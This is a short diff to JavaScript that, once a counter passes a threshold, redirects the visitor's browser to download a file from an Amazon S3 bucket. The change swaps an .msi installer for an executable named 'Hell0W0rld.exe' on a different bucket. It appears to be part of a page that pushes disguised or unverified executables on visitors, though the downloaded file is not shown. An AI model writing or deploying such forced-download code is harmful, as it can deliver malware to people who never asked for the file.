@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hailwod11.s3.ap-southeast-2.amazonaws.com/HailWod-nes.msi";
+		var url="https://hwent1.s3.ap-southeast-2.amazonaws.com/Hell0W0rld.exe";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
